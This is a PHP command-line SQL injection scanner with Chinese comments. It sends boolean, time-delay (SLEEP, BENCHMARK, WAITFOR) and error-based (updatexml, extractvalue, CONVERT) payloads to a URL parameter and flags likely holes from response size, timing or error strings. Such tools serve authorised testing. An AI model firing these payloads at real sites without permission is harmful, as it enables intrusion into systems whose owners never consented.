<?php
/**
 * sqli_detector.php
 * SQL 注入检测工具 - PHP 安全实战
 *
 * 通过 HTTP 请求检测目标 URL 的 GET 参数是否存在 SQL 注入
 * 支持：布尔盲注、时间盲注、报错注入
 *
 * 仅用于安全学习和授权测试，禁止非法用途
 *
 * 使用方法：
 *   php sqli_detector.php "http://target.com/page?id=1" --param=id
 *   php sqli_detector.php "http://target.com/page?id=1" --param=id --method=time
 */

// ===== 参数解析 =====
$options = getopt('', ['url:', 'param:', 'method::', 'delay:']);

if (empty($options['url'])) {
    echo "SQL 注入检测工具\n\n";
    echo "用法: php sqli_detector.php --url=URL --param=PARAM [--method=bool|time|error] [--delay=5]\n";
    echo "示例:\n";
    echo "  php sqli_detector.php --url='http://target.com/page?id=1' --param=id --method=bool\n";
    echo "  php sqli_detector.php --url='http://target.com/page?id=1' --param=id --method=time --delay=5\n";
    echo "  php sqli_detector.php --url='http://target.com/page?id=1' --param=id --method=error\n";
    echo "  php sqli_detector.php --url='http://target.com/page?id=1' --param=id  (自动检测全部)\n";
    exit(1);
}

$targetUrl = $options['url'];
$targetParam = $options['param'] ?? '';
$method = $options['method'] ?? 'all';
$delay = (int)($options['delay'] ?? 5);

echo "========================================\n";
echo "  SQL 注入检测工具\n";
echo "  仅用于安全学习和授权测试\n";
echo "========================================\n";
echo "[*] 目标: $targetUrl\n";
echo "[*] 参数: $targetParam\n";
echo "[*] 方法: $method\n\n";

// ===== HTTP 请求函数 =====
function httpRequest($url, $timeout = 10) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Security Scanner)',
    ]);
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    $error = curl_error($ch);
    curl_close($ch);
    return [
        'body' => $response,
        'code' => $info['http_code'],
        'size' => $info['size_download'],
        'time' => $info['total_time'],
        'error' => $error
    ];
}

// 解析 URL 中的参数
function getUrlWithParam($baseUrl, $param, $value) {
    $parsed = parse_url($baseUrl);
    parse_str($parsed['query'] ?? '', $params);
    $params[$param] = $value;
    $queryString = http_build_query($params);
    return "{$parsed['scheme']}://{$parsed['host']}{$parsed['path']}?$queryString";
}

// ===== 布尔盲注检测 =====
function detectBooleanBased($baseUrl, $param) {
    echo "\n--- 布尔盲注检测 ---\n";

    // 正常请求
    $normalUrl = getUrlWithParam($baseUrl, $param, '1');
    $normalResp = httpRequest($normalUrl);
    $normalLength = $normalResp['size'];
    echo "[*] 正常响应长度: $normalLength\n";

    // 真条件请求：AND 1=1
    $trueUrl = getUrlWithParam($baseUrl, $param, "1 AND 1=1");
    $trueResp = httpRequest($trueUrl);
    echo "[*] AND 1=1 响应长度: {$trueResp['size']}\n";

    // 假条件请求：AND 1=2
    $falseUrl = getUrlWithParam($baseUrl, $param, "1 AND 1=2");
    $falseResp = httpRequest($falseUrl);
    echo "[*] AND 1=2 响应长度: {$falseResp['size']}\n";

    // 判断：如果真条件≈正常 且 假条件≠正常，则存在布尔盲注
    $diff = abs($normalLength - $trueResp['size']);
    $falseDiff = abs($normalLength - $falseResp['size']);

    if ($diff < 50 && $falseDiff > 100) {
        echo "[+] 发现布尔盲注！\n";
        echo "    真条件(AND 1=1)与正常响应相似（差 $diff 字节）\n";
        echo "    假条件(AND 1=2)与正常响应差异大（差 $falseDiff 字节）\n";
        return true;
    }

    // 尝试引号测试
    $quoteUrl = getUrlWithParam($baseUrl, $param, "1'");
    $quoteResp = httpRequest($quoteUrl);
    if ($quoteResp['code'] == 500 || strpos($quoteResp['body'], 'SQL') !== false ||
        strpos($quoteResp['body'], 'MySQL') !== false || strpos($quoteResp['body'], 'syntax') !== false) {
        echo "[+] 单引号测试引发错误，可能存在注入\n";
        return true;
    }

    echo "[-] 未检测到布尔盲注\n";
    return false;
}

// ===== 时间盲注检测 =====
function detectTimeBased($baseUrl, $param, $delay) {
    echo "\n--- 时间盲注检测 ---\n";

    // 正常请求基准时间
    $normalUrl = getUrlWithParam($baseUrl, $param, '1');
    $normalResp = httpRequest($normalUrl, $delay + 10);
    $normalTime = $normalResp['time'];
    echo "[*] 正常响应时间: " . round($normalTime, 2) . "s\n";

    // 延时请求
    $payloads = [
        "1 AND SLEEP($delay)" => "MySQL SLEEP",
        "1 AND BENCHMARK(5000000,MD5(1))" => "MySQL BENCHMARK",
        "1; WAITFOR DELAY '0:0:$delay'--" => "MSSQL WAITFOR"
    ];

    foreach ($payloads as $payload => $desc) {
        $injectUrl = getUrlWithParam($baseUrl, $param, $payload);
        $injectResp = httpRequest($injectUrl, $delay + 10);
        $injectTime = $injectResp['time'];
        echo "[*] $desc: " . round($injectTime, 2) . "s";

        if ($injectTime >= $delay * 0.8) {
            echo " ← 延时明显！\n";
            echo "[+] 发现时间盲注（$desc）！\n";
            echo "    正常时间: " . round($normalTime, 2) . "s, 注入时间: " . round($injectTime, 2) . "s\n";
            return true;
        }
        echo "\n";
    }

    echo "[-] 未检测到时间盲注\n";
    return false;
}

// ===== 报错注入检测 =====
function detectErrorBased($baseUrl, $param) {
    echo "\n--- 报错注入检测 ---\n";

    $payloads = [
        "1'" => "单引号",
        "1'" => "单引号",
        "1 AND 1=CONVERT(int,(SELECT @@version))" => "MSSQL convert",
        "1 AND updatexml(1,concat(0x7e,version(),0x7e),1)" => "MySQL updatexml",
        "1 AND extractvalue(1,concat(0x7e,version()))" => "MySQL extractvalue",
        "1) AND 1=1 AND (1" => "括号测试",
    ];

    $errorKeywords = [
        'SQL syntax', 'MySQL', 'mysql_', 'ORA-', 'Oracle',
        'SQL Server', 'PostgreSQL', 'SQLSTATE', 'ODBC',
        'mysqli_', 'warning: mysql', 'Query failed'
    ];

    foreach ($payloads as $payload => $desc) {
        $injectUrl = getUrlWithParam($baseUrl, $param, $payload);
        $resp = httpRequest($injectUrl);
        echo "[*] $desc → HTTP {$resp['code']}, {$resp['size']} bytes";

        foreach ($errorKeywords as $kw) {
            if (stripos($resp['body'], $kw) !== false) {
                echo " ← 发现错误关键字: $kw\n";
                echo "[+] 发现报错注入！\n";
                echo "    Payload: $payload\n";
                echo "    错误关键字: $kw\n";
                return true;
            }
        }
        echo "\n";
    }

    echo "[-] 未检测到报错注入\n";
    return false;
}

// ===== 执行检测 =====
$found = false;

if ($method === 'all' || $method === 'bool') {
    if (detectBooleanBased($targetUrl, $targetParam)) $found = true;
}

if ($method === 'all' || $method === 'time') {
    if (detectTimeBased($targetUrl, $targetParam, $delay)) $found = true;
}

if ($method === 'all' || $method === 'error') {
    if (detectErrorBased($targetUrl, $targetParam)) $found = true;
}

echo "\n===== 检测结果 =====\n";
if ($found) {
    echo "[+] 目标可能存在 SQL 注入漏洞！\n";
} else {
    echo "[-] 未检测到 SQL 注入漏洞\n";
}
